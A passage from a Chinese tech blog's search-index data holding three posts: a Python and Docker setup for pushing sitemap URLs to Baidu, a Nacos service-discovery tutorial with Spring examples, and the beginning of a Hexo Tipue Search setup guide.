return \'\'def writeRecordFile(record_file_path, content): record_file = open(record_file_path, \'w\') record_file.writelines(content) record_file.close()def readRecordFile(record_file_path): content = "0" if(os.path.exists(record_file_path)): record_file = open(record_file_path, \'r\') content = record_file.readline() record_file.close() if(len(content) == 0): content = "0" return contentdef countWebsiteMapUrl(): total = 0 content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): total = total + 1 website_map_file.close() return totaldef createUrlFile(url_file_path, max_lines): old_index = readRecordFile(day_record_file) content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) url_file = open(url_file_path, \'w\') # write url file index = 0 number = 0 for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): if(index &lt; int(old_index)): index = index + 1 continue url = getUrl(line) if(url != \'\'): index = index + 1 number = number + 1 url_file.writelines(url + "\\n") if(number &gt;= max_lines): break # update record file if(index == countWebsiteMapUrl()): writeRecordFile(day_record_file, str(0)) else: writeRecordFile(day_record_file, str(index)) # close file url_file.close() website_map_file.close()def submitUrlFile(url, url_file_path, log_file): shell_cmd_line = "curl -H \'Content-Type:text/plain\' --data-binary @" + url_file_path + " " + \'\\"\' + url + \'\\"\' (status, output) = subprocess.getstatusoutput(shell_cmd_line) logging.info(output + "\\n") # print(shell_cmd_line)if __name__ == "__main__": logging.basicConfig(level=logging.INFO, format=\'%(asctime)s - %(name)s - %(levelname)s - %(message)s\', filename=log_file) createUrlFile(day_submit_urls_file, day_submit_max_lines) submitUrlFile(day_submit_url, day_submit_urls_file, log_file) Crontab 定时任务Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时主动提交链接到百度搜索资源平台。 12# 每天凌晨三点主动提交一次链接0 3 * * * /usr/bin/python3 /usr/local/baidu-push/baidu_xiongzhang_day.py 脚本输出的日志信息12345678$ cat /tmp/baidu_xiongzhang_day.log2020-01-19 21:46:08,072 - www - INFO - % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0100 507 100 67 100 440 555 3648 --:--:-- --:--:-- --:--:-- 3666{"remain":5,"success":10,"success_realtime":10,"remain_realtime":5} Docker 一键部署收录服务 Dockerfile 的内容如下，构建生成 Docker 镜像后，使用命令直接启动 Docker 镜像即可。 使用命令直接启动 Docker 镜像时，需要通过 -v 参数将宿主机的 Python 脚本文件挂载到 Docker 容器内的 /usr/local/python_scripts/baidu_xiongzhang_day.py 位置。 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 3 * * * root /usr/bin/python3 /usr/local/python_scripts/baidu_xiongzhang_day.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 若通过 Docker-Compose 来管理 Docker 镜像，那么 YML 配置文件的内容如下： 123456789101112version: \'3.5\'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: \'Asia/Shanghai\' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/baidu_xiongzhang_day.py:/usr/local/python_scripts/baidu_xiongzhang_day.py 数据卷挂载： /usr/local/baidu-push/logs：宿主机里的日志目录 /usr/local/baidu-push/baidu_xiongzhang_day.py：宿主机里 Python 脚本文件的路径 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"python"},{title:"Nacos 入门教程 - 服务发现基础篇",url:"/posts/f9da4c12.html",text:'服务发现介绍微服务架构概述为适应企业的业务发展，提高软件研发的生产力，降低软件研发的成本，软件架构也作了升级和优化，将一个独立的系统拆分成若干小的服务，每个小服务运行在不同的进程中，服务与服务之间采用 RESTful、RPC 等协议传输数据，每个服务所拥有的功能具有独立性强的特点，这样的设计就实现了单个服务的高内聚，服务与服务之间的低耦合效果，这些小服务就是微服务，基于这种方法设计的系统架构即微服务架构。微服务架构的优点如下： 易于开发和维护：一个微服务只会关注一个特定的业务功能，所以它业务清晰，代码量较少 单个微服务启动较快：单个微服务代码量较少，所以启动会比较快 业务之间松耦合，无论是在开发阶段或者部署阶段，不同的服务都是互相独立的 局部修改容易部署：单体应用只要有修改，就得重新部署整个应用，微服务解决了这样的问题 技术栈不受限：在微服务架构中，可以结合项目业务及团队的特点，合理地选择技术栈 按需伸缩：可根据需求，实现细粒度的扩展 只有业务逻辑的代码，不会和 HTML、CSS 或者其他前端页面耦合，目前有两种开发模式：前后端分离、全栈开发 什么是服务发现在微服务架构中，整个系统会按职责能力划分为多个服务，通过服务之间协作来实现业务目标。这样在代码中免不了要进行服务间的远程调用，服务的消费方要调用服务的生产方，为了完成一次请求，消费方需要知道服务生产方的网络位置（IP 地址和端口号）。一般情况下，代码可以通过读取配置文件的方式读取服务生产方网络位置，如下图所示： 看上去很完美，但是仔细考虑以下，此方案对于微服务应用而言行不通。首先，微服务可能是部署在云环境的，服务实例的网络位置或许是动态分配的。另外，每一个服务一般会有多个实例来做负载均衡，由于宕机或升级，服务实例网络地址会经常动态改变。再者，每一个服务也可能应对临时访问压力增加新的服务节点，如下图所示： 基于以上的问题，服务之间如何相互发现？服务如何管理？这就是服务发现的问题了。服务发现就是服务消费方通过服务发现中心智能发现服务提供方，从而进行远程调用的过程，如下图所示： 上图中服务实例本身并不记录服务生产方的网络地址，所有服务实例内部都会包含服务发现客户端。 在每个服务启动时会向服务发现中心上报自己的网络位置，这样在服务发现中心内部会形成一个服务注册表，服务注册表是服务发现的核心部分，是包含所有服务实例的网络地址的数据库 服务发现客户端会定期从服务发现中心同步服务注册表，并缓存在客户端 当需要对某服务进行请求时，服务实例通过该注册表，定位目标服务网络地址。若目标服务存在多个网络地址，则使用负载均衡算法从多个服务实例中选择出一个，然后发出请求。 总结： 在微服务环境中，由于服务运行实例的网络地址是不断动态变化的，服务实例数量的动态变化 ，因此无法使用固定的配置文件来记录服务提供方的网络地址，必须使用动态的服务发现机制用于实现微服务间的相互感知。各服务实例会上报自己的网络地址，这样服务中心就形成了一个完整的服务注册表，各服务实例会通过服务发现中心来获取访问目标服务的网络地址，从而实现服务发现的机制。 服务发现协作流程 服务发现产品对比 Nacos 作为服务发现中心，具备更多的功能支持项，且从长远来看 Nacos 在以后的版本会支持 Spring Cloud + Kubernetes 的组合，填补两者者的鸿沟，在两套体系下可以采用同一套服务发现和配置管理的解决方案，这将大大的简化使用和维护的成本。另外，Nacos 计划实现 Service Mesh，也是未来微服务发展的趋势，更多关于 Nacos 的介绍可以看这里。 Nacos 服务发现管理服务发现数据模型Nacos 在经过阿里内部多年生产经验后提炼出的数据模型，是一种服务 - 集群 - 实例的三层模型，这样基本可以满足服务在所有场景下的数据存储和管理。 命名空间（Namespace） 用于进行租户粒度的配置隔离，命名空间不仅适用于 Nacos 的配置管理，同样适用于服务发现。Namespace 的常用场景之一是不同环境的配置的区分隔离，例如开发测试环境和生产环境的资源（如配置、服务）隔离等。 服务 提供给客户端的软件功能，通过预定义接口进行网络访问。 服务名 服务提供方的标识，通过该标识可以唯一确定其指代的服务。 实例 提供一个或多个服务的具有可访问网络地址（IP:Port）的进程，启动一个服务，就产生了一个服务实例。 元信息 Nacos 数据（如配置和服务）描述信息，如服务版本、权重、容灾策略、负载均衡策略、鉴权配置、各种自定义标签 (label），从作用范围来看，分为服务级别的元信息、集群的元信息及实例的元信息 集群 服务实例的集合，服务实例组成一个默认集群，集群可以被进一步按需求划分，划分的单位可以是虚拟集群，相同集群下的实例才能相互感知。 服务发现配置示例应用通过 Namespace、Cluster、Service 的配置，描述了该服务向哪个环境（如开发环境）的哪个集群注册实例 123456789spring: application: name: transaction‐service cloud: nacos: discovery: server‐addr: 127.0.0.1:8848 namespace: a1f8e863‐3117‐48c4‐9dd3‐e9ddc2af90a8 cluster-name: DEFAULT 集群作为实例的隔离，相同集群的实例才能相互感知 namespace、cluster-name 若不填写都将采用默认值，namespace 的默认是 public 命名空间，cluster-name 的默认值为 DEFAULT 集群 服务发现管理功能服务管理 开发者或者运维人员往往需要在服务注册后，通过友好的界面来查看服务的注册情况，包括当前系统注册的所有服务和每个服务的详情。并在有权限控制的情况下，进行服务的一些配置的编辑操作。Nacos 在目前最新版本开放的控制台的服务发现部分，主要就是提供用户一个基本的运维页面，能够查看、编辑当前注册的服务，这些功能集中在 Nacos 控制台的服务管理一级菜单内。 服务列表管理 服务列表帮助用户以统一的视图管理其所有的微服务以及服务健康状态。整体界面布局是左上角有服务的搜索框和搜索按钮，页面中央是服务列表的展示。服务列表主要展示服务名、集群数目、实例数目、健康实例数目和详情按钮五个栏目。 服务流量权重支持及流量保护 Nacos 为用户提供了流量权重控制的能力，同时开放了服务流量的阈值保护，以帮助用户更好的保护服务服务提供者集群不被意外打垮。如下图所示，可以点击实例的 编辑 按钮，修改实例的权重。如果想增加实例的流量，可以将权重调大；如果不想实例接收流量，则可以将权重设为 0。 服务元数据管理 Nacos 提供多个维度的服务元数据的暴露，帮助用户存储自定义的信息。这些信息都是以 K-V 的数据结构存储，在控制台上，会以 JSON 数据格式来展示。类似的，编辑元数据可以通过相同的格式进行。例如服务的元数据编辑，首先点击服务详情页里的 编辑 按钮，然后在元数据输入框输入：{"version": 1.0}。 服务优雅上下线 Nacos 还提供服务实例的上下线操作，在服务详情页面，可以点击实例的 上线 或者 下线 按钮，被下线的实例，将不会包含在健康的实例列表里。 Nacos Discovery Spring 入门案例1.0、版本说明在本案例中，Spring 的版本为 5.2.x，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 1.1、添加 Maven 依赖12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.12.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-spring-context&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 1.2、创建 Nacos 配置类通过添加 @EnableNacosDiscovery 注解开启 Nacos Spring 的服务发现功能 1234567891011121314package com.nacos.study.configuration;import com.alibaba.nacos.api.annotation.NacosProperties;import com.alibaba.nacos.spring.context.annotation.discovery.EnableNacosDiscovery;import org.springframework.context.annotation.Configuration;/** * @author clay */@Configuration@EnableNacosDiscovery(globalProperties = @NacosProperties(serverAddr = "127.0.0.1:8848"))public class NacosConfiguration {} 1.3、创建 Controller 测试类使用 @NacosInjected 注入 Nacos 的 NamingService 实例，通过该实例获取 Nacos Server 的服务列表 123456789101112131415161718192021222324252627282930package com.nacos.study.controller;import com.alibaba.nacos.api.annotation.NacosInjected;import com.alibaba.nacos.api.exception.NacosException;import com.alibaba.nacos.api.naming.NamingService;import com.alibaba.nacos.api.naming.pojo.Instance;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;import java.util.List;/** * @author clay */@Controller@RequestMapping("/discovery")public class DiscoveryController { @NacosInjected private NamingService namingService; @RequestMapping(value = "/get", method = RequestMethod.GET) @ResponseBody public List&lt;Instance&gt; get(@RequestParam(defaultValue = "") String serviceName) throws NacosException { return namingService.getAllInstances(serviceName); }} 1.4、配置 web.xml12345678910&lt;servlet&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 1.5、配置 dispatcherServlet-servlet.xml1234567&lt;!-- Spring MVC Annotation-Driven --&gt;&lt;mvc:annotation-driven/&gt;&lt;!-- Spring Context Annotation-Driven --&gt;&lt;context:annotation-config/&gt;&lt;context:component-scan base-package="com.nacos.study"/&gt; 1.6、调用 Nacos Open API 注册服务调用 Nacos Open API 注册一个名称为 example 的服务，这里模拟了服务生产者自动注册服务到 Nacos Server。由于注册的服务不是真实存在的，因此服务注册一段时间后，会因 Nacos Server 的健康检查机制而被剔除出服务列表 1$ curl -X PUT \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=example&amp;ip=127.0.0.1&amp;port=8080\' 1.7、测试应用程序 将 Spring Web 应用部署到 Tomcat 服务器 浏览器访问 http://127.0.0.1:8080/discovery/get?serviceName=example，若响应结果如下，则说明程序运行正常 1234567891011121314151617181920[ { "instanceId": "127.0.0.1#8080#DEFAULT#DEFAULT_GROUP@@example", "ip": "127.0.0.1", "port": 8080, "weight": 1.0, "healthy": true, "enabled": true, "ephemeral": true, "clusterName": "DEFAULT", "serviceName": "DEFAULT_GROUP@@example", "metadata": { }, "instanceHeartBeatInterval": 5000, "instanceHeartBeatTimeOut": 15000, "ipDeleteTimeout": 30000, "instanceIdGenerator": "simple" }] Nacos Discovery Spring Boot 入门案例2.0、版本说明在本案例中，Spring Boot 的版本为 2.0.3.RELEASE，对应的 Nacos Discovery Spring Boot 的版本为 0.2.7，Nacos Server 的版本为 1.4.0，点击下载完整的案例代码。 2.1、添加 Maven 依赖特别注意，Nacos Spring Boot Starter 版本 0.2.x.RELEASE 对应的是 Spring Boot 2.x 版本，版本 0.1.x.RELEASE 对应的是 Spring Boot 1.x 版本。 12345678910111213141516171819202122232425&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;nacos-discovery-spring-boot.version&gt;0.2.7&lt;/nacos-discovery-spring-boot.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-discovery-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${nacos-discovery-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.2、创建启动主类1234567@SpringBootApplicationpublic class NacosDiscoveryApplication { public static void main(String[] args) { SpringApplication.run(NacosDiscoveryApplication.class, args); }} 2.3、创建 Controller 测试类使用 @NacosInjected 注入 Nacos 的 NamingService 实例，通过该实例获取 Nacos Server 的服务列表 12345678910111213@Controller@RequestMapping("/discovery")public class DiscoveryController { @NacosInjected private NamingService namingService; @RequestMapping(value = "/get", method = RequestMethod.GET) @ResponseBody public List&lt;Instance&gt; get(@RequestParam(defaultValue = "") String serviceName) throws NacosException { return namingService.getAllInstances(serviceName); }} 2.4、配置 application.properties在 application.properties 中配置 Nacos Server 的地址 1nacos.discovery.server-addr=127.0.0.1:8848 2.5、调用 Nacos Open API 注册服务调用 Nacos Open API 注册一个名称为 example 的服务，这里模拟了服务生产者自动注册服务到 Nacos Server。由于注册的服务不是真实存在的，因此服务注册一段时间后，会因 Nacos Server 的健康检查机制而被剔除出服务列表 1$ curl -X PUT \'http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=example&amp;ip=127.0.0.1&amp;port=8080\' 2.6、测试应用程序 启动 Spring Boot 应用 浏览器访问 http://127.0.0.1:8080/discovery/get?serviceName=example，若响应结果如下，则说明程序运行正常 1234567891011121314151617181920[ { "instanceId": "127.0.0.1#8080#DEFAULT#DEFAULT_GROUP@@example", "ip": "127.0.0.1", "port": 8080, "weight": 1.0, "healthy": true, "enabled": true, "ephemeral": true, "clusterName": "DEFAULT", "serviceName": "DEFAULT_GROUP@@example", "metadata": { }, "instanceIdGenerator": "simple", "instanceHeartBeatInterval": 5000, "instanceHeartBeatTimeOut": 15000, "ipDeleteTimeout": 30000 }] Nacos Discovery Spring Cloud 入门案例3.0、版本说明在本案例中，Spring Cloud 的版本是 Greenwich.SR6，对应的 Spring Boot 版本是 2.1.18.RELEASE，对应的 Nacos Discovery Spring Cloud 版本为 2.1.3.RELEASE，Nacos 官方版本说明可以看这里，点击下载完整的案例代码。 3.1、创建 Maven 父工程在 Maven 父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体配置如下。特别注意，Nacos Spring Cloud Starter 版本 2.1.x.RELEASE 对应的是 Spring Boot 2.1.x 版本，版本 2.0.x.RELEASE 对应的是 Spring Boot 2.0.x 版本，版本 1.5.x.RELEASE 对应的是 Spring Boot 1.5.x 版本，Nacos 官方版本说明可以看这里。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;nacos-discovery-spring-cloud.version&gt;2.1.3.RELEASE&lt;/nacos-discovery-spring-cloud.version&gt;&lt;/properties&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${nacos-discovery-spring-cloud.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3.2、创建 Provider Service 工程创建 Provider Service 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-alibaba-nacos-discovery 依赖 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Controller 测试类 123456789@RestController@RequestMapping("/provider")public class ProviderController { @GetMapping("/call") public String call() { return "provider invoke"; }} 在 application.properties 中配置 Nacos Server 的地址 12345678910server: port: 56011spring: application: name: provider-service cloud: nacos: discovery: server-addr: 127.0.0.1:8848 3.3、创建 Consumer Service 工程创建 Consumer Service 的 Maven 工程，配置工程里的 pom.xml 文件，引入 spring-cloud-starter-alibaba-nacos-discovery 依赖，由于需要通过 Feign Client 调用远程服务，因此还需要引入 spring-cloud-starter-openfeign 依赖 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;&lt;/dependency&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，将服务注册到 Nacos Server，同时添加 @EnableFeignClients 注解来启用 Feign Client 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建服务接口类，用于调用 Provider Service 暴露的 API 1234567@FeignClient("provider-service")public interface ProviderClient { @GetMapping("/provider/call") public String call();} 创建 Controller 测试类，因为需要创建一个 API 来供第三方调用 Provider Service 的那个自定义 API 12345678910111213@RestController@RequestMapping("/consumer")public class ConsumerController { @Autowired private ProviderClient providerClient; @GetMapping("/call") public String call() { return "consumer invoke | " + providerClient.call(); }} 在 application.properties 中配置 Nacos Server 的地址 12345678910server: port: 56010spring: application: name: consumer-service cloud: nacos: discovery: server-addr: 127.0.0.1:8848 3.4、测试应用程序 1）分别启动 nacos-provider-service、nacos-consumer-service 应用 2）浏览器访问 http://127.0.0.1:56011/provider/call，若响应结果为 provider invoke，则说明 nacos-provider-service 应用运行正常 3）浏览器访问 http://127.0.0.1:56010/consumer/call，若响应结果为 consumer invoke | provider invoke，则说明 nacos-consumer-service 应用运行正常 4）在 Nascos Server 的控制台，可以看到已经有两个服务成功注册了，如下图： 5）若希望测试多实例（Provider）的负载均衡调用情况，可以修改 Provider Service 工程下的 application.properties 配置文件里的 server.port 参数（如下），然后通过 -Dport=xxxxx VM 参数指定不同的端口来启动多个 Provider Service 应用即可 12server: port: ${port:56011} 补充内容Endpoint 信息查看Spring Boot 支持这一点，Nacos Discovery 也可以使用 Endpoint 来暴露信息，先决条件是将依赖 spring-boot-starter-actuator 添加到 pom.xml 文件中，并配置端点安全策略。 Spring Boot 1.x：添加配置 management.security.enabled = false Spring Boot 2.x：添加配置 management.endpoints.web.exposure.include = * Spring Boot 1.x：Nacos Discovery 端点查看的 URL 是 http://127.0.0.1:18083/nacos_discovery Spring Boot 2.x：Nacos Discovery 端点查看的 URL 是 http://127.0.0.1:18083/actuator/nacos-discovery Nacos 服务发现原理浅析服务注册 在 Spring 应用程序的启动阶段，将监视 WebServerInitializedEvent 事件。在初始化 Web 容器后收到 WebServerInitializedEvent 事件时，将触发注册操作，并调用 ServiceRegistry 注册方法以将服务注册到 Nacos Server。 服务发现 NacosServerList 实现 com.netflix.loadbalancer.ServerList 接口，并在 @ConditionOnMissingBean 下自动注入它。 Nacos 服务发现常用配置说明 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Hexo 添加站内静态搜索（全站搜索）功能",url:"/posts/47b23c66.html",text:'前言网上各种 Hexo 站内静态搜索（全文搜索）方案，原理基本都是通过 Hexo 插件动态生成 JSON 数据文件，然后基于 JSON 数据文件，使用 JS 开发简单的搜索引擎，以此达到搜索目的。目前主流的方案是使用 NexT 主题集成的 hexo-generator-searchdb 插件，可惜该方案的 UI 代码和 JS 代码都严重耦合了 NexT 主题，对其他 Hexo 主题并不友好。由于笔者的博客使用的是 Yilia 主题，因此只能尝试其他替代方案，最终发现 Tipue Search 配合 hexo-tipue-search-db 实现的搜索效果挺不错。Tipue Search 是一款 JQuery 搜索插件，提供了基础的 UI 界面 和 JS 搜索引擎，只要浏览器支持 JQuery 就可以开箱即用，而且 UI 样式支持高度定制，非常适合对搜索界面有强自定义需求的使用场景。这里值得注意的是，上面介绍的站内静态搜索方案都存在共同的致命弱点，那就是当文章数量比较多的时候，Hexo 插件动态生成的数据文件的体积会很大（单位：MB），导致用户首次加载搜索界面时非常慢；而且由于浏览器缓存的缘故，不一定能够实时搜索到最新的文章内容。此时若想从根本上解决上述痛点，只能引入后端的搜索引擎技术，例如 Elasticsearch、Solr、Lucene 等，可这又违背了 Hexo 打造静态博客的初衷。附上本站 Tipue Search 的演示案例。 Hexo 安装插件插件安装 hexo-tipue-search-db 插件主要用来生成搜索引擎需要的 JS 数据文件（tipuesearch_content.js），默认存放的文件路径为： ${blog_root}/public/tipuesearch/tipuesearch_content.js，该插件兼容 Tipue Search 7.1 +。 12345# 进入博客的根目录$ cd ${blog_root}# 安装Hexo插件$ npm install hexo-tipue-search-db --save 插件配置123tipue_search_db: exclude_page: false # Default posts and pages are included in generated db file, you can exclude pages by value true path: \'/tipuesearch/tipuesearch_content.js\' # Custom db file path, base on directory \'${blog_root}/public\' Tipue Search 配置值得一提的是，下面介绍的配置内容原则上适用于任何 Hexo 主题，只是个别配置细节不同而已，笔者已验证过可以适用于 Yilia 与 NexT 8.x 主题。 Tipue Search 下载本教程使用 Tipue Search 7.1，从本站下载 Tipue Search 7.1 的压缩包并解压。以 Yilia 主题为例子，将解压后得到的 tipuesearch 文件夹复制到 Yilia 主题的 ${theme_dir}/source 目录下。若使用的 Hexo 主题是 NexT 8.x，则将解压后得到的 tipuesearch 文件夹复制到 NexT 主题的 ${theme_dir}/source/lib 目录下。 添加 HTML 代码到 HEAD 标签内将以下代码添加到 Hexo 主题的模板文件中的 HEAD 标签内，以 Yilia 主题为例子，模板文件的路径可参考：${theme_dir}/layout/_partial/head.ejs 1234567&lt;link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css"&gt;&lt;script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="tipuesearch/tipuesearch_content.js"&gt;&lt;/script&gt;&lt;link rel="stylesheet" href="tipuesearch/tipuesearch.css"&gt;&lt;script src="tipuesearch/tipuesearch_set.js"&gt;&lt;/script&gt;&lt;script src="tipuesearch/tipuesearch.min.js"&gt;&lt;/script&gt; 添加搜索框到指定的 Web 页面在需要使用搜索框的任意 UI 模板（Web 页面）中添加以下代码，样式可以根据自己的需求高度自定义 12345678910111213&lt;form&gt; &lt;div class="tipue_search_group"&gt; &lt;input type="text" name="q" id="tipue_search_input" pattern=".{3,}" title="At least 3 characters" autofocus="autofocus" required&gt;&lt;button type="submit" class="tipue_search_button"&gt;&lt;div class="tipue_search_icon"&gt;&amp;#9906;&lt;/div&gt;&lt;/button&gt; &lt;/div&gt;&lt;/form&gt;&lt;div id="tipue_search_content"&gt;&lt;/div&gt;&lt;script&gt; $(document).ready(function() { $(\'#tipue_search_input\').tipuesearch(); });&lt;/script&gt; 或者添加到 Hexo 新建的搜索页面中 12# 通过Hexo的命令新增搜索页面$ hexo new page search 添加 HTML5 的自动补全功能若希望 Tipue Search 的搜索框使用 HTML5 